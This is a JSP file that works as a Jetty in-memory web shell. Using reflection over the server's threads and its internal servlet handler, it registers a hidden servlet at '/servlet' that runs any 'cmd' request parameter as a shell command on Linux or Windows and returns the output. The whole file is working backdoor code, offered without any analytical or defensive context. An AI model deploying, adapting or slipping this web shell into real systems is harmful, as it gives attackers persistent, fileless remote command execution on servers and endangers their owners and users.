<%@ page import="java.lang.reflect.Field"%>
<%@ page import="java.lang.reflect.Method"%>
<%@ page import="java.util.Scanner"%>
<%@ page import="java.io.*"%>
<%
    String servletName = "myServlet";
    String urlPattern = "/servlet";
    Servlet servlet = new Servlet() {
        @Override
        public void init(ServletConfig servletConfig) throws ServletException {
        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            if (req.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[] {"sh", "-c", req.getParameter("cmd")} : new String[] {"cmd.exe", "/c", req.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner( in ).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                servletResponse.getWriter().write(output);
                servletResponse.getWriter().flush();
                return;
            }
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {
        }
    };
    Method threadMethod = Class.forName("java.lang.Thread").getDeclaredMethod("getThreads");
    threadMethod.setAccessible(true);
    Thread[] threads = (Thread[]) threadMethod.invoke(null);
    ClassLoader threadClassLoader = null;
    for (Thread thread : threads)
    {
        threadClassLoader = thread.getContextClassLoader();
        if(threadClassLoader != null){
            if(threadClassLoader.toString().contains("WebAppClassLoader")){
                Field fieldContext = threadClassLoader.getClass().getDeclaredField("_context");
                fieldContext.setAccessible(true);
                Object webAppContext = fieldContext.get(threadClassLoader);
                Field fieldServletHandler = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
                fieldServletHandler.setAccessible(true);
                Object servletHandler = fieldServletHandler.get(webAppContext);
                Field fieldServlets = servletHandler.getClass().getDeclaredField("_servlets");
                fieldServlets.setAccessible(true);
                Object[] servlets = (Object[]) fieldServlets.get(servletHandler);
                boolean flag = false;
                for(Object s:servlets){
                    Field fieldName = s.getClass().getSuperclass().getDeclaredField("_name");
                    fieldName.setAccessible(true);
                    String name = (String) fieldName.get(s);
                    if(name.equals(servletName)){
                        flag = true;
                        break;
                    }
                }
                if(flag){
                    out.println("[-] Servlet " + servletName + " exists.<br>");
                    return;
                }
                out.println("[+] Add Servlet: " + servletName + "<br>");
                out.println("[+] urlPattern: " + urlPattern + "<br>");
                ClassLoader classLoader = servletHandler.getClass().getClassLoader();
                Class sourceClazz = null;
                Object holder = null;
                Field field = null;
                try{
                    sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                    field = sourceClazz.getDeclaredField("JAVAX_API");
                    Method method = servletHandler.getClass().getMethod("newServletHolder", sourceClazz);
                    holder = method.invoke(servletHandler, field.get(null));
                }catch(ClassNotFoundException e){
                    sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                    Method method = servletHandler.getClass().getMethod("newServletHolder", sourceClazz);
                    holder = method.invoke(servletHandler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                }
                holder.getClass().getMethod("setName", String.class).invoke(holder, servletName);
                holder.getClass().getMethod("setServlet", Servlet.class).invoke(holder, servlet);
                servletHandler.getClass().getMethod("addServlet", holder.getClass()).invoke(servletHandler, holder);
                Class clazz = classLoader.loadClass("org.eclipse.jetty.servlet.ServletMapping");
                Object servletMapping = null;
                try{
                    servletMapping = clazz.getDeclaredConstructor(sourceClazz).newInstance(field.get(null));
                }catch(NoSuchMethodException e){
                    servletMapping = clazz.newInstance();
                }
                servletMapping.getClass().getMethod("setServletName", String.class).invoke(servletMapping, servletName);
                servletMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(servletMapping, new Object[]{new String[]{urlPattern}});
                servletHandler.getClass().getMethod("addServletMapping", clazz).invoke(servletHandler, servletMapping);
            }     
        }
    }
%>